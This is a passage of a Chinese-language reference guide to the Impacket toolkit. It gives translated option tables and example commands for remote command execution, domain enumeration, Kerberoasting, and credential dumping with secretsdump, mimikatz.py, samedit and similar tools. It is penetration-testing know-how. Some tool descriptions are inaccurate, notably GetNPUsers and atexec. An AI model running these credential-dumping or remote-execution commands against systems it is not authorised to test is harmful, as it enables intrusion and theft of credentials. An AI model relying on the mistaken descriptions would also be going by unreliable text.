---
title: Impacket wiki中文指南
date: 2026-04-08 12:00:00
categories:
  - 工具wiki
tags:
  - 工具wiki
---

# Impacket wiki中文指南

由于impacket的工具他是没有所谓的wiki介绍的，导致很多时候要用一些py脚本的时候需要不停的查看帮助使用。我这里这里针对impacket0.13稳定版的68个脚本的使用做了翻译和分类。使用的时候我们可以直接把该md喂给ai让ai去给出相关py脚本的命令效率更快。

## 远程执行工具

### psexec.py

**功能**: Windows 远程命令执行工具，基于 Sysinternals PsExec
**用途**: 通过 SMB 协议在远程 Windows 系统上执行命令

**参数说明**:

**位置参数**:

| 参数      | 说明                                                                      |
| --------- | ------------------------------------------------------------------------- |
| `target`  | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `command` | 要在目标系统执行的命令（默认: cmd.exe）                                   |

**选项参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-c pathname`           | 复制文件以便后续执行，参数通过 command 选项传递    |
| `-path PATH`            | 要执行的命令路径                                   |
| `-file FILE`            | 替代 RemCom 二进制文件（确保不需要 CRT）           |
| `-ts`                   | 为每个日志输出添加时间戳                           |
| `-debug`                | 开启调试输出                                       |
| `-codec CODEC`          | 设置目标输出使用的编码（默认 "gbk"）               |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**连接参数**:

| 参数                                     | 说明                        |
| ---------------------------------------- | --------------------------- |
| `-dc-ip ip address`                      | 域控制器的 IP 地址          |
| `-target-ip ip address`                  | 目标机器的 IP 地址          |
| `-port [destination port]`               | 连接到 SMB 服务器的目标端口 |
| `-service-name service_name`             | 用于触发有效负载的服务名称  |
| `-remote-binary-name remote_binary_name` | 上传到目标的可执行文件名称  |

**示例**:

```python
python psexec.py domain/username:password@target_ip
python psexec.py -c "program.exe" domain/username:password@target_ip
```

### wmiexec.py

**功能**: 通过 WMI (Windows Management Instrumentation) 进行远程命令执行
**用途**: 使用 WMI 接口在远程系统上执行命令，无需上传执行文件

**参数说明**:

**位置参数**:

| 参数      | 说明                                                                      |
| --------- | ------------------------------------------------------------------------- |
| `target`  | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `command` | 要在目标系统执行的命令，如果为空则启动半交互式 shell                      |

**选项参数**:

| 参数                           | 说明                                    |
| ------------------------------ | --------------------------------------- |
| `-share SHARE`                 | 从中获取输出的共享（默认 ADMIN$）       |
| `-nooutput`                    | 是否不打印输出（不创建 SMB 连接）       |
| `-ts`                          | 为每个日志输出添加时间戳                |
| `-silentcommand`               | 不执行 cmd.exe 来运行给定命令（无输出） |
| `-debug`                       | 开启调试输出                            |
| `-codec CODEC`                 | 设置目标输出使用的编码（默认 "gbk"）    |
| `-shell-type {cmd,powershell}` | 为半交互式 shell 选择命令处理器         |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address`     | 域控制器的 IP 地址                                 |
| `-target-ip ip address` | 目标机器的 IP 地址                                 |
| `-A authfile`           | smbclient/mount.cifs 样式的身份验证文件            |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**示例**:

```python
python wmiexec.py domain/username:password@target_ip
python wmiexec.py -shell-type powershell domain/username:password@target_ip
```

### smbexec.py

**功能**: 通过 SMB 进行远程命令执行
**用途**: 使用 SMB 协议在远程系统上执行命令

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数                           | 说明                                         |
| ------------------------------ | -------------------------------------------- |
| `-share SHARE`                 | 从中获取输出的共享（默认 C$）                |
| `-mode {SERVER,SHARE}`         | 使用的模式（默认 SHARE，SERVER 需要 root！） |
| `-ts`                          | 为每个日志输出添加时间戳                     |
| `-debug`                       | 开启调试输出                                 |
| `-codec CODEC`                 | 设置目标输出使用的编码（默认 "gbk"）         |
| `-shell-type {cmd,powershell}` | shell 类型                                   |

**连接参数**:

| 参数                         | 说明                        |
| ---------------------------- | --------------------------- |
| `-dc-ip ip address`          | 域控制器的 IP 地址          |
| `-target-ip ip address`      | 目标机器的 IP 地址          |
| `-port [destination port]`   | 连接到 SMB 服务器的目标端口 |
| `-service-name service_name` | 用于触发有效负载的服务名称  |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**示例**:

```python
python smbexec.py domain/username:password@target_ip
python smbexec.py -shell-type powershell domain/username:password@target_ip
```

### dcomexec.py

**功能**: 通过 DCOM (Distributed Component Object Model) 进行远程命令执行
**用途**: 使用 DCOM 接口在远程系统上执行命令

**参数说明**:

**位置参数**:

| 参数      | 说明                                                                      |
| --------- | ------------------------------------------------------------------------- |
| `target`  | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `command` | 要在目标系统执行的命令，如果为空则启动半交互式 shell                      |

**选项参数**:

| 参数                                                | 说明                                                        |
| --------------------------------------------------- | ----------------------------------------------------------- |
| `-share SHARE`                                      | 从中获取输出的共享（默认 ADMIN$）                           |
| `-nooutput`                                         | 是否不打印输出（不创建 SMB 连接）                           |
| `-ts`                                               | 为每个日志输出添加时间戳                                    |
| `-debug`                                            | 开启调试输出                                                |
| `-codec CODEC`                                      | 设置目标输出使用的编码（默认 "gbk"）                        |
| `-object [{ShellWindows,ShellBrowserWindow,MMC20}]` | 用于执行 shell 命令的 DCOM 对象（默认=ShellWindows）        |
| `-com-version MAJOR_VERSION:MINOR_VERSION`          | DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION               |
| `-shell-type {cmd,powershell}`                      | 为半交互式 shell 选择命令处理器                             |
| `-silentcommand`                                    | 不执行 cmd.exe 来运行给定命令（无输出，不能运行 dir/cd 等） |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address`     | 域控制器的 IP 地址                                 |
| `-A authfile`           | smbclient/mount.cifs 样式的身份验证文件            |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**示例**:

```python
python dcomexec.py domain/username:password@target_ip
python dcomexec.py -object ShellBrowserWindow domain/username:password@target_ip
```

### atexec.py

**功能**: 通过服务执行远程命令
**用途**: 创建临时服务来执行命令

**参数说明**:

**位置参数**:

| 参数      | 说明                                                                      |
| --------- | ------------------------------------------------------------------------- |
| `target`  | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `command` | 要在目标系统执行的命令                                                    |

**选项参数**:

| 参数                     | 说明                                       |
| ------------------------ | ------------------------------------------ |
| `-session-id SESSION_ID` | 要使用的现有登录会话（无输出，无 cmd.exe） |
| `-ts`                    | 为每个日志输出添加时间戳                   |
| `-silentcommand`         | 不执行 cmd.exe 来运行给定命令（无输出）    |
| `-debug`                 | 开启调试输出                               |
| `-codec CODEC`           | 设置目标输出使用的编码（默认 "gbk"）       |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address`     | 域控制器的 IP 地址                                 |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**示例**:

```python
python atexec.py domain/username:password@target_ip "ipconfig"
python atexec.py -silentcommand domain/username:password@target_ip "net user"
```

## 域信息收集工具

### GetADUsers.py

**功能**: 获取域用户详细信息
**用途**: 枚举域内所有用户账户及其属性

**参数说明**:

**位置参数**:

| 参数     | 说明                         |
| -------- | ---------------------------- |
| `target` | domain[/username[:password]] |

**选项参数**:

| 参数             | 说明                                                                                                  |
| ---------------- | ----------------------------------------------------------------------------------------------------- |
| `-user username` | 请求特定用户的数据                                                                                    |
| `-all`           | 返回所有用户，包括没有电子邮件地址和已禁用的账户。与 -user 一起使用时，即使账户已禁用也会返回用户信息 |
| `-ts`            | 为每个日志输出添加时间戳                                                                              |
| `-debug`         | 开启调试输出                                                                                          |

**认证参数**:

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                            |
| `-no-pass`              | 不询问密码（对 -k 有用）                                     |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据 |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）           |

**连接参数**:

| 参数                | 说明                   |
| ------------------- | ---------------------- |
| `-dc-ip ip address` | 域控制器的 IP 地址     |
| `-dc-host hostname` | 要使用的域控制器主机名 |

**示例**:

```python
python GetADUsers.py domain/username:password@dc_ip
python GetADUsers.py -all domain/username:password@dc_ip
python GetADUsers.py -user administrator domain/username:password@dc_ip
```

### GetADComputers.py

**功能**: 获取域内所有计算机信息
**用途**: 枚举域内所有计算机及其属性

**参数说明**:

**位置参数**:

| 参数     | 说明                         |
| -------- | ---------------------------- |
| `target` | domain[/username[:password]] |

**选项参数**:

| 参数             | 说明                                                    |
| ---------------- | ------------------------------------------------------- |
| `-user username` | 请求特定用户的数据                                      |
| `-ts`            | 为每个日志输出添加时间戳                                |
| `-debug`         | 开启调试输出                                            |
| `-resolveIP`     | 尝试解析计算机对象的 IP 地址，通过在 DC 上执行 nslookup |

**认证参数**:

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                            |
| `-no-pass`              | 不询问密码（对 -k 有用）                                     |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据 |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）           |

**连接参数**:

| 参数                | 说明                   |
| ------------------- | ---------------------- |
| `-dc-ip ip address` | 域控制器的 IP 地址     |
| `-dc-host hostname` | 要使用的域控制器主机名 |

**示例**:

```python
python GetADComputers.py domain/username:password@dc_ip
python GetADComputers.py -resolveIP domain/username:password@dc_ip
```

### GetUserSPNs.py

**功能**: 获取用户服务主体名称
**用途**: 查找域内配置了 SPN 的用户账户，可用于 Kerberoasting 攻击

**参数说明**:

**位置参数**:

| 参数     | 说明                         |
| -------- | ---------------------------- |
| `target` | domain[/username[:password]] |

**选项参数**:

| 参数                           | 说明                                                                                       |
| ------------------------------ | ------------------------------------------------------------------------------------------ |
| `-target-domain TARGET_DOMAIN` | 要查询/请求的域（如果与用户域不同），允许跨信任域进行 Kerberoasting                        |
| `-no-preauth NO_PREAUTH`       | 不需要预认证的账户，通过 AS 获取服务票据                                                   |
| `-stealth`                     | 从 LDAP 查询中移除 (servicePrincipalName=\*) 过滤器以增加隐蔽性，可能导致大域内存消耗/错误 |
| `-machine-only`                | 仅查询计算机账户，将 objectCategory=person 改为 objectCategory=computer                    |
| `-usersfile USERSFILE`         | 每行一个用户的测试文件                                                                     |
| `-request`                     | 请求用户的 TGS 并以 JtR/hashcat 格式输出                                                   |
| `-request-user username`       | 请求与指定用户关联的 SPN 的 TGS（仅用户名，无需域）                                        |
| `-request-machine machinename` | 请求与指定计算机关联的 SPN 的 TGS，例如 `workstation01$`                                   |
| `-save`                        | 将请求的 TGS 保存到磁盘，格式为 <username>.ccache，自动选择 -request                       |
| `-outputfile OUTPUTFILE`       | 以 JtR/hashcat 格式输出密码的文件名，自动选择 -request                                     |
| `-ts`                          | 为每个日志输出添加时间戳                                                                   |
| `-debug`                       | 开启调试输出                                                                               |

**认证参数**:

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                            |
| `-no-pass`              | 不询问密码（对 -k 有用）                                     |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据 |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）           |

**连接参数**:

| 参数                | 说明                   |
| ------------------- | ---------------------- |
| `-dc-ip ip address` | 域控制器的 IP 地址     |
| `-dc-host hostname` | 要使用的域控制器主机名 |

**示例**:

```python
python GetUserSPNs.py domain/username:password@dc_ip
python GetUserSPNs.py -request domain/username:password@dc_ip
python GetUserSPNs.py -request-user administrator domain/username:password@dc_ip
python GetUserSPNs.py -target-domain target.local domain/username:password@dc_ip
```

### GetNPUsers.py

**功能**: 获取空密码用户账户
**用途**: 查找域内配置为空密码或可被匿名访问的用户

**参数说明**:

**位置参数**:

| 参数     | 说明                           |
| -------- | ------------------------------ |
| `target` | [[domain/]username[:password]] |

**选项参数**:

| 参数                     | 说明                                           |
| ------------------------ | ---------------------------------------------- |
| `-request`               | 请求用户的 TGT 并以 JtR/hashcat 格式输出       |
| `-outputfile OUTPUTFILE` | 以 JtR/hashcat 格式输出密码的文件名            |
| `-format {hashcat,john}` | 保存无预认证用户 AS_REQ 的格式，默认为 hashcat |
| `-usersfile USERSFILE`   | 每行一个用户的测试文件                         |
| `-ts`                    | 为每个日志输出添加时间戳                       |
| `-debug`                 | 开启调试输出                                   |

**认证参数**:

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                            |
| `-no-pass`              | 不询问密码（对 -k 有用）                                     |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据 |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）           |

**连接参数**:

| 参数                | 说明                   |
| ------------------- | ---------------------- |
| `-dc-ip ip address` | 域控制器的 IP 地址     |
| `-dc-host hostname` | 要使用的域控制器主机名 |

**示例**:

```python
python GetNPUsers.py domain/ -request
python GetNPUsers.py -usersfile users.txt domain/ -request
python GetNPUsers.py -format john domain/ -request
```

### lookupsid.py

**功能**: SID 查询和转换工具
**用途**: 将 SID 转换为用户名或组名

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `maxRid` | 要检查的最大 Rid（默认 4000）                                             |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**连接参数**:

| 参数                       | 说明                                |
| -------------------------- | ----------------------------------- |
| `-target-ip ip address`    | 目标机器的 IP 地址                  |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口         |
| `-domain-sids`             | 枚举域 SID（可能会将请求转发到 DC） |

**认证参数**:

| 参数                    | 说明                                    |
| ----------------------- | --------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH       |
| `-no-pass`              | 不询问密码（通过 smbrelayx 代理时有用） |
| `-k`                    | 使用 Kerberos 身份验证                  |

**示例**:

```python
python lookupsid.py domain/username:password@target_ip
python lookupsid.py -domain-sids domain/username:password@target_ip
python lookupsid.py target_ip 1000
```

### findDelegation.py

**功能**: 查找域内委派配置
**用途**: 检测域内的委派设置，用于权限提升
**示例**:

```python
python findDelegation.py domain/username:password@dc_ip
```

### machine_role.py

**功能**: 查询机器角色（域控制器/成员服务器）
**用途**: 检索主机的角色及其主要域详细信息

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-ts`    | 为每个日志输出添加时间戳 |
| `-debug` | 开启调试输出             |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**示例**:

```python
python machine_role.py target_ip
python machine_role.py domain/username:password@target_ip
python machine_role.py -target-ip 192.168.1.100 domain/username:password@target_name
```

### netview.py

**功能**: 网络视图信息收集
**用途**: 获取网络共享和会话信息
**示例**:

```python
python netview.py domain/username:password@target_ip
```

### net.py

**功能**: 网络管理信息收集
**用途**: SAMR RPC 客户端实现

**参数说明**:

**位置参数**:

| 参数                               | 说明                                                                      |
| ---------------------------------- | ------------------------------------------------------------------------- |
| `target`                           | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `{user,computer,localgroup,group}` | 账户条目名称                                                              |
| user                               | `user`: 枚举所有域/本地用户账户                                           |
| computer                           | `computer`: 枚举域级别中的所有计算机                                      |
| localgroup                         | `localgroup`: 枚举本地计算机的本地组（别名）                              |
| group                              | `group`: 枚举在域控制器中注册的域组                                       |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python net.py user domain/username:password@target_ip
python net.py computer domain/username:password@target_ip
python net.py localgroup domain/username:password@target_ip
python net.py group domain/username:password@target_ip
```

## 凭证提取工具

### secretsdump.py

**功能**: 转储域哈希和密码哈希
**用途**: 从域控制器或本地系统提取密码哈希，无需在目标系统上执行任何代理

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                                                     |
| -------- | -------------------------------------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` 或 LOCAL（如果要解析本地文件） |

**选项参数**:

| 参数                                                   | 说明                                                                          |
| ------------------------------------------------------ | ----------------------------------------------------------------------------- |
| `-ts`                                                  | 为每个日志输出添加时间戳                                                      |
| `-debug`                                               | 开启调试输出                                                                  |
| `-system SYSTEM`                                       | 要解析的 SYSTEM hive（仅二进制 REGF，.reg 文本文件缺少计算 bootkey 的元数据） |
| `-bootkey BOOTKEY`                                     | SYSTEM hive 的 bootkey                                                        |
| `-security SECURITY`                                   | 要解析的 SECURITY hive                                                        |
| `-sam SAM`                                             | 要解析的 SAM hive                                                             |
| `-ntds NTDS`                                           | 要解析的 NTDS.DIT 文件                                                        |
| `-resumefile RESUMEFILE`                               | 恢复文件名称，用于恢复 NTDS.DIT 会话转储                                      |
| `-skip-sam`                                            | 不解析远程系统上的 SAM hive                                                   |
| `-skip-security`                                       | 不解析远程系统上的 SECURITY hive                                              |
| `-outputfile OUTPUTFILE`                               | 基本输出文件名，将为 sam、secrets、cached 和 ntds 添加扩展名                  |
| `-use-vss`                                             | 使用 NTDSUTIL VSS 方法代替默认的 DRSUAPI                                      |
| `-rodcNo RODCNO`                                       | RODC krbtgt 账户的编号（仅适用于 Kerb-Key-List 方法）                         |
| `-rodcKey RODCKEY`                                     | 只读域控制器的 AES 密钥（仅适用于 Kerb-Key-List 方法）                        |
| `-use-keylist`                                         | 使用 Kerb-Key-List 方法代替默认的 DRSUAPI                                     |
| `-exec-method [{smbexec,wmiexec,mmcexec}]`             | 在目标上使用的远程执行方法（仅在使用 -use-vss 时）                            |
| `-use-remoteSSWMI`                                     | 通过 WMI 远程创建影子快照并下载 SAM、SYSTEM 和 SECURITY                       |
| `-use-remoteSSWMI-NTDS`                                | 使用远程影子快照方法时也转储 NTDS.DIT                                         |
| `-remoteSSWMI-remote-volume REMOTESSWMI_REMOTE_VOLUME` | 执行影子快照并下载文件的远程卷（默认为 C:\）                                  |
| `-remoteSSWMI-local-path REMOTESSWMI_LOCAL_PATH`       | 从影子快照下载文件的本地路径（默认为当前路径）                                |

**显示选项**:

| 参数                     | 说明                                              |
| ------------------------ | ------------------------------------------------- |
| `-just-dc-user USERNAME` | 仅提取指定用户的 NTDS.DIT 数据                    |
| `-ldapfilter LDAPFILTER` | 根据 LDAP 过滤器提取特定用户的 NTDS.DIT 数据      |
| `-just-dc`               | 仅提取 NTDS.DIT 数据（NTLM 哈希和 Kerberos 密钥） |
| `-just-dc-ntlm`          | 仅提取 NTDS.DIT 数据（仅 NTLM 哈希）              |
| `-skip-user SKIP_USER`   | 不提取指定用户的 NTDS.DIT 数据                    |
| `-pwd-last-set`          | 显示每个 NTDS.DIT 账户的 pwdLastSet 属性          |
| `-user-status`           | 显示用户是否被禁用                                |
| `-history`               | 转储密码历史记录和 LSA secrets OldVal             |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-keytab KEYTAB`        | 从 keytab 文件读取 SPN 的密钥                      |

**连接参数**:

| 参数                    | 说明               |
| ----------------------- | ------------------ |
| `-dc-ip ip address`     | 域控制器的 IP 地址 |
| `-target-ip ip address` | 目标机器的 IP 地址 |

**示例**:

```python
python secretsdump.py domain/username:password@dc_ip
python secretsdump.py -just-dc domain/username:password@dc_ip
python secretsdump.py -just-dc-user "administrator" domain/username:password@dc_ip
```

### samrdump.py

**功能**: 转储 SAM 数据库内容
**用途**: 从远程系统获取 SAM 数据库信息，下载目标系统的用户列表

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-csv`   | 启用 CSV 输出            |
| `-ts`    | 为每个日志输出添加时间戳 |
| `-debug` | 开启调试输出             |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**示例**:

```python
python samrdump.py target_ip
python samrdump.py -csv domain/username:password@target_ip
python samrdump.py -hashes 00000000000000000000000000000000:hash domain/username@target_ip
```

### samedit.py

**功能**: 编辑 SAM 数据库
**用途**: 就地编辑 SAM hive 文件中本地用户的密码

**参数说明**:

**位置参数**:

| 参数   | 说明                     |
| ------ | ------------------------ |
| `user` | 要替换密码的用户账户名称 |
| `sam`  | 要编辑的 SAM hive 文件   |

**选项参数**:

| 参数                 | 说明                                           |
| -------------------- | ---------------------------------------------- |
| `-password PASSWORD` | 要设置的新密码                                 |
| `-hashes HASHES`     | 直接替换 NTLM 哈希（LM 哈希可选）              |
| `-system SYSTEM`     | 包含用于密码加密的 bootkey 的 SYSTEM hive 文件 |
| `-bootkey BOOTKEY`   | 用于加密和解密 SAM 密码的 bootkey              |
| `-debug`             | 开启调试输出                                   |
| `-ts`                | 为每个日志输出添加时间戳                       |

**示例**:

```python
python samedit.py administrator SAM
python samedit.py -password newpassword administrator SAM
python samedit.py -hashes 00000000000000000000000000000000:新NTLM哈希 administrator SAM
python samedit.py -system SYSTEM administrator SAM
python samedit.py -bootkey bootkey_hex administrator SAM
```

### mimikatz.py

**功能**: 模拟 mimikatz 功能提取凭证
**用途**: 从内存中提取凭证信息

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数         | 说明                                      |
| ------------ | ----------------------------------------- |
| `-file FILE` | 包含要在迷你 shell 中执行的命令的输入文件 |
| `-debug`     | 开启调试输出                              |
| `-ts`        | 为每个日志输出添加时间戳                  |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                    | 说明               |
| ----------------------- | ------------------ |
| `-dc-ip ip address`     | 域控制器的 IP 地址 |
| `-target-ip ip address` | 目标机器的 IP 地址 |

**示例**:

```python
python mimikatz.py domain/username:password@target_ip
python mimikatz.py -file commands.txt domain/username:password@target_ip
python mimikatz.py -hashes 00000000000000000000000000000000:hash domain/username@target_ip
```

### DumpNTLMInfo.py

**功能**: 转储 NTLM 信息
**用途**: 执行 NTLM 身份验证并解析信息

**参数说明**:

**位置参数**:

| 参数     | 说明           |
| -------- | -------------- |
| `target` | 目标名称或地址 |

**选项参数**:

| 参数                     | 说明                                                                                    |
| ------------------------ | --------------------------------------------------------------------------------------- |
| `-debug`                 | 开启调试输出                                                                            |
| `-ts`                    | 为每个日志输出添加时间戳                                                                |
| `-target-ip ip address`  | 目标机器的 IP 地址。如果省略，将使用指定的目标。当目标是 NetBIOS 名称且无法解析时很有用 |
| `-port destination port` | 连接到 SMB/RPC 服务器的目标端口                                                         |
| `-protocol [protocol]`   | 使用的协议（SMB 或 RPC）。默认为 SMB，端口 135 通常使用 RPC                             |

**示例**:

```python
python DumpNTLMInfo.py target_ip
python DumpNTLMInfo.py -protocol RPC target_ip
python DumpNTLMInfo.py -port 135 target_ip
python DumpNTLMInfo.py -target-ip 192.168.1.100 target_name
```

### Get-GPPPassword.py

**功能**: 获取组策略首选项密码
**用途**: 组策略首选项密码查找器和解密器

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                                                     |
| -------- | -------------------------------------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` 或 LOCAL（如果要解析本地文件） |

**选项参数**:

| 参数                 | 说明                     |
| -------------------- | ------------------------ |
| `-share SHARE`       | SMB 共享                 |
| `-base-dir BASE_DIR` | 要搜索的目录（默认：/）  |
| `-ts`                | 为每个日志输出添加时间戳 |
| `-debug`             | 开启调试输出             |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python Get-GPPPassword.py domain/username:password@dc_ip
python Get-GPPPassword.py -share SYSVOL domain/username:password@dc_ip
python Get-GPPPassword.py LOCAL -base-dir "C:\Windows\SYSVOL"
```

### GetLAPSPassword.py

**功能**: 获取 LAPS 密码
**用途**: 从 LDAP 提取 LAPS（本地管理员密码解决方案）密码

**参数说明**:

**位置参数**:

| 参数     | 说明                         |
| -------- | ---------------------------- |
